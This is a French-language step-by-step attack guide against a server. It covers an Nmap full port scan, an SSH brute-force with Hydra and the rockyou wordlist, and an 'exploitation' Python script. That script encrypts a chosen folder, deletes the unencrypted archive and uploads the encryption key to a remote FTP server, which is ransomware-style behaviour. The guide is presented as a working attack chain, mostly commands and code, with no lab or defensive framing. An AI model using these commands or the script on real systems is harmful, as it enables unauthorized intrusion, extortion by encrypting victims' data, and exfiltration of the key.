### Reconnaissance :  

Pour effectuer un scan avec Nmap afin d’identifier les ports ouverts et les services associés, une commande courante et complète est la suivante :

```bash
nmap -A -p- <adresse_IP_cible>
```

Explications des options utilisées :

- **-A** : Active plusieurs fonctionnalités avancées, notamment la détection du système d’exploitation, la détection de versions, l’exécution de scripts Nmap par défaut et la réalisation d’un traceroute.  
- **-p-** : Indique à Nmap de scanner tous les ports (de 1 à 65535).

Cette combinaison permet d’obtenir une vision très complète des services qui tournent sur la cible. Si vous souhaitez un scan un peu moins exhaustif, vous pouvez limiter le nombre de ports, par exemple :

```bash
nmap -sV -p 1-1000 <adresse_IP_cible>
```

Ici, le **-sV** activera la détection de version des services, et le **-p 1-1000** limitera le scan aux 1000 premiers ports les plus courants, ce qui peut être plus rapide.

### Attaque :  
prerequis :  
  - Dictionnaire : https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
Pour mener une attaque par force brute sur un service SSH à l’aide de **Hydra**, vous pouvez utiliser la syntaxe suivante :

```bash
hydra -l <nom_utilisateur> -P <chemin/liste_mdp.txt> ssh://<adresse_IP_cible> -t 4 -V
```

**Explications des options :**  
- **-l <nom_utilisateur>** : Spécifie un nom d’utilisateur unique à tester.  
  - Si vous voulez tester plusieurs noms d’utilisateurs, utilisez **-L <liste_utilisateurs.txt>** à la place.  
- **-P <chemin/liste_mdp.txt>** : Indique la liste de mots de passe à tester.  
- **ssh://<adresse_IP_cible>** : Spécifie le protocole (ssh) et l’adresse IP de la cible.  
- **-t 4** : Définit le nombre de tâches (threads) parallèles, ici 4. Vous pouvez augmenter ou diminuer ce nombre en fonction de la performance.  
- **-V** : Mode verbeux, affiche chaque tentative.

**Exemple complet :**

```bash
hydra -l admin -P /home/user/liste_mots_de_passe.txt ssh://192.168.1.10 -t 4 -V
```

Exploitation :  


Ci-dessous un exemple de script Python « tout-en-un » qui :

1. Vérifie la présence de la dépendance `cryptography`.  
2. Si elle n’est pas installée, le script l’installe automatiquement via `pip`.  
3. Ensuite, il exécute le code principal (génération de clé, chiffrement, etc.).

Ce script suppose que :  
- Vous avez un accès à internet sur le serveur.  
- `pip` est disponible sur le serveur (la plupart des environnements Python récents incluent `pip`).  
- Les autres modules utilisés (`ftplib`, `tarfile`, `getpass`, `os`) font partie de la bibliothèque standard de Python et n’ont pas besoin d’être installés.

### Script complet

```python
import sys
import subprocess
import os
import tarfile
import getpass
from ftplib import FTP

# Vérification/installation des dépendances
try:
    from cryptography.fernet import Fernet
except ImportError:
    print("[*] Le module 'cryptography' n'est pas installé. Installation en cours...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    # Réessayer l'import après installation
    from cryptography.fernet import Fernet

def compress_directory(directory_path, archive_name):
    """
    Compresse un répertoire en une archive tar.gz.
    """
    with tarfile.open(archive_name, "w:gz") as tar:
        tar.add(directory_path, arcname=os.path.basename(directory_path))

def encrypt_file(key, input_file, output_file):
    """
    Chiffre un fichier avec la clé fournie (Fernet).
    """
    f = Fernet(key)
    with open(input_file, 'rb') as f_in:
        data = f_in.read()
    encrypted_data = f.encrypt(data)
    with open(output_file, 'wb') as f_out:
        f_out.write(encrypted_data)

def upload_key_ftp(ftp_host, ftp_user, ftp_password, local_key_file, remote_key_file):
    """
    Envoie la clé sur le serveur FTP.
    """
    ftp = FTP(ftp_host)
    ftp.login(ftp_user, ftp_password)
    with open(local_key_file, 'rb') as f:
        ftp.storbinary(f"STOR {remote_key_file}", f)
    ftp.quit()

def main():
    # 1. Génération de la clé de chiffrement
    key = Fernet.generate_key()
    key_file = "encryption_key.key"
    with open(key_file, 'wb') as f:
        f.write(key)
    print(f"[+] Clé de chiffrement générée et enregistrée dans {key_file}")

    # 2. Demander à l'utilisateur de choisir un dossier à chiffrer
    directory_to_encrypt = input("Entrez le chemin du dossier à chiffrer : ").strip()
    if not os.path.isdir(directory_to_encrypt):
        print("Le chemin spécifié n'est pas un répertoire valide.")
        return

    # 3. Compression du dossier
    archive_name = "data_to_encrypt.tar.gz"
    compress_directory(directory_to_encrypt, archive_name)
    print(f"[+] Dossier {directory_to_encrypt} compressé dans {archive_name}")

    # 4. Chiffrement de l'archive
    encrypted_file = "data_encrypted.enc"
    encrypt_file(key, archive_name, encrypted_file)
    print(f"[+] Fichier {archive_name} chiffré dans {encrypted_file}")

    # (Optionnel) Supprimer l’archive non chiffrée
    os.remove(archive_name)

    # 5. Exporter la clé vers le serveur FTP
    ftp_host = input("Entrez l'IP/nom du serveur FTP : ").strip()
    ftp_user = input("Nom d'utilisateur FTP : ").strip()
    ftp_password = getpass.getpass("Mot de passe FTP : ")

    remote_key_file = "encryption_key.key"  # Nom du fichier distant, à adapter
    upload_key_ftp(ftp_host, ftp_user, ftp_password, key_file, remote_key_file)
    print(f"[+] Clé {key_file} envoyée sur le serveur FTP {ftp_host} en tant que {remote_key_file}")

    # Optionnel : supprimer la clé locale si on ne veut pas la garder
    # os.remove(key_file)

    print("[+] Opération terminée avec succès.")

if __name__ == "__main__":
    main()
```

### Comment utiliser ce script ?

- Copiez-le dans un fichier `script.py`.  
- Sur le serveur, exécutez :  
  ```bash
  python3 script.py
  ```  
- Le script va vérifier si `cryptography` est installé. Si non, il va l’installer.  
- Puis il vous demandera le chemin du dossier à chiffrer, l’adresse du serveur FTP, ainsi que vos identifiants FTP.
  
Une fois terminé, vous aurez :  
- Le fichier chiffré (`data_encrypted.enc`) localement.  
- La clé de chiffrement (`encryption_key.key`) envoyée sur le serveur FTP.
